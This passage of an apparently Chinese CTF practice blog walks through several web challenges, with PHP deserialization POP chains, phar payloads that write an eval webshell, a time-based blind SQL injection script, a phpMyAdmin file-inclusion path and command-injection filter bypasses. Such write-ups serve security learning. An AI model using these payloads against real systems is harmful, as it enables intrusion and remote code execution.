/fl\ag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Start</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$web</span> = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"><span class="variable">$pwn</span> = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$crypto</span> = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"><span class="variable">$reverse</span> = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$misc</span> = <span class="keyword">new</span> <span class="title class_">Misc</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$Start</span>-&gt;errMsg=<span class="variable">$crypto</span>;</span><br><span class="line"><span class="variable">$crypto</span>-&gt;obj=<span class="variable">$reverse</span>;</span><br><span class="line"><span class="variable">$reverse</span>-&gt;func=<span class="variable">$pwn</span>;</span><br><span class="line"><span class="variable">$pwn</span>-&gt;obj=<span class="variable">$web</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$Start</span>);</span><br></pre></td></tr></table></figure>

<p>但是不理解为什么要将payload最后的}删去</p>
<h1 id="NewStarCTF-2023-公开赛道-逃"><a href="#NewStarCTF-2023-公开赛道-逃" class="headerlink" title="[NewStarCTF 2023 公开赛道]逃"></a>[NewStarCTF 2023 公开赛道]逃</h1><p>字符串增多的逃逸题目</p>
<?php
highlight_file(__FILE__);
function waf($str){
  return str_replace("bad","good",$str);
}

class GetFlag {
  public $key;
  public $cmd = "whoami";
  public function __construct($key)
  {
    $this->key = $key;
  }
  public function __destruct()
  {
    system($this->cmd);
  }
}

unserialize(waf(serialize(new GetFlag($_GET['key']))));

利用替换增加的一个字符构造指令将越来的踢出去

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$a=new GetFlag(&quot;bad&quot;);</span></span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"><span class="comment">//echo waf(serialize($a));</span></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="string">&quot;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\&quot;;s:3:\&quot;cmd\&quot;;s:4:\&quot;ls /\&quot;;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

# [NewStarCTF 2023 公开赛道]PharOne

phar反序列化

发现源码中存在class.php文件



上传phar文件

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;?=eval(\$_GET[1]);?&gt;&#x27;&gt;/var/www/html/1.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>(); </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;A.phar&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705210529787.png" class="" title="image-20250705210529787">

直接上传发现其过滤掉了__HALT_COMPILER()，

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705210716993.png" class="" title="image-20250705210716993">

gzip压缩绕过

参考文章[PHP(Phar) 反序列化漏洞及各种绕过姿势](https://ibaiyang.github.io/blog/php/2023/04/13/PHP(Phar)-反序列化漏洞及各种绕过姿势.html#phar反序列化)

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705211012947-1751721014553-3.png" class="" title="image-20250705211012947">

压缩后使用jpg后缀即可

上传后使用phar协议读取文件即可执行phar文件上传木马

file=phar://upload/156005c5baf40ff51a327f1c34f2975b.jpg

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706003448663.png" class="" title="image-20250706003448663">

# [NewStarCTF 2023 公开赛道]Unserialize Again

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$fffflag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;fire&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user.<span class="variable language_">$this</span>-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;pass==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$nothing</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    <span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    <span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;多吃雪梨&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

查看源码，发现在最后能过文件上传直接尝试通过传参上传文件

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706093238852.png" class="" title="image-20250706093238852">

发现可以上传php文件没有过滤

并且上传成功的木马可以被解析

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706093320998.png" class="" title="image-20250706093320998">

应该是非预期解，预期应该通过phar反序列化进行做题。



阅读代码发现利用点在

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706091151922.png" class="" title="image-20250706091151922">

没有unsearsize这样的利用点<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706091430516.png" class="" title="image-20250706091430516">

file_exists可以被phar进行利用

利用gc回收机制绕过weakup

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;ture&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">story</span>();</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;666&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setDefaultStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

# [NewStarCTF 2023 公开赛道]midsql

尝试注入

发现过滤了空格和=使用/**/和like进行绕过即可

但是发现其无回显，使用时间盲注

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://e8dc055e-b6d6-46c3-9770-01d66d39ee7d.node5.buuoj.cn:81/?id=&#x27;</span></span><br><span class="line"></span><br><span class="line">database_name = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        payload = url + <span class="string">f&quot;1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/ctf.items),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)#&quot;</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        response = requests.get(payload).text</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        use_time = end_time - start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> use_time &gt; <span class="number">2</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(mid)</span><br><span class="line">    database_name += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(database_name)</span><br></pre></td></tr></table></figure>

# [GWCTF 2019]我有一个数据库

#### [phpMyAdmin](https://so.csdn.net/so/search?q=phpMyAdmin&spm=1001.2101.3001.7020) 4.8.1 远程文件包含 CVE-2018-12613 漏洞复现

/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag

直接读取flag文件

[CVE-2018-12613 PhpMyadmin后台文件包含复现 - 北孤清茶。 - 博客园](https://www.cnblogs.com/lthlsy/p/14775131.html)

参考文章

[ThinkPHP]5-Rce

[thinkphp 5-rce版本漏洞复现(超详细版)_thinkphp 漏洞扫描-CSDN博客](https://blog.csdn.net/weixin_44862511/article/details/132132998)

打cve进行rce

# [WUSTCTF2020]朴实无华

先扫目录有robots.txt查看发现假的flag

抓包发现响应头中隐藏这一个页面

/fl4g.php

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看你，看我的动力淡了，不是想看时间，只是想不经意间让你知道我曾经比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;用钱解决不了空虚人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;这不算闯关&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想要在这个CTFer拿到flag么，意识流溢出，前往东郊村，找到一定的线索，把推理讲出去，自然有道，才学可窃.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我从烧烤摊看我的眼神里，看他打了个电话，把他一定安排到不是闯关的人&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;这不算闯关&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想要到这里，我得完全破防，有钱人的心理多多少少就是这样的空虚无聊，并且自私.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;马上滚出考场&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;这不算闯关&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% asset_img image-<span class="number">20250707021034112</span>.png image-<span class="number">20250707021034112</span> %&#125;</span><br></pre></td></tr></table></figure>

第一层科学计数法绕过，第二层md5若比较

使用$IFS$9来绕过对空格的过滤

?num=11e3&md5=0e215962017&get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag

# [BJDCTF2020]Mark loves cat

dirsearch扫目录发现.git可能存在源码泄露上网

但是使用githack无法拉取下来源码，可能是题目环境问题

上网查找源码

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">// 包含外部文件 &#x27;flag.php&#x27;，可能包含变量 $flag include &#x27;flag.php&#x27;; // 初始化三个变量 $yds = &quot;dog&quot;;     // $yds 被设置为 &quot;dog&quot; $is = &quot;cat&quot;;      // $is 被设置为 &quot;cat&quot; $handsome = &#x27;yds&#x27;; // $handsome 被设置为字符串 &#x27;yds&#x27; // 遍历 $_POST 数组，将每个键值对赋值给动态生成的变量 foreach($_POST as $x =&gt; $y)&#123;    $$x = $y; // 例如，如果 $_POST 包含 &#x27;foo&#x27; =&gt; &#x27;bar&#x27;，则生成 $foo = &#x27;bar&#x27; &#125; // 遍历 $_GET 数组，将每个键值对赋值给动态生成的变量 foreach($_GET as $x =&gt; $y)&#123;    $$x = $$y; // 例如，如果 $_GET 包含 &#x27;foo&#x27; =&gt; &#x27;bar&#x27;，则生成 $foo = $bar 的值 &#125; // 再次遍历 $_GET 数组，检查特定条件 foreach($_GET as $x =&gt; $y)&#123;    // 如果 $_GET[&#x27;flag&#x27;] 的值等于当前键名且键名不为 &#x27;flag&#x27;    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;        // 输出 $handsome 的值并终止脚本执行        exit($handsome);    &#125; &#125; // 检查是否存在 $_GET[&#x27;flag&#x27;] 或 $_POST[&#x27;flag&#x27;] if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;    // 如果这两个参数都没有被设置，输出 $yds 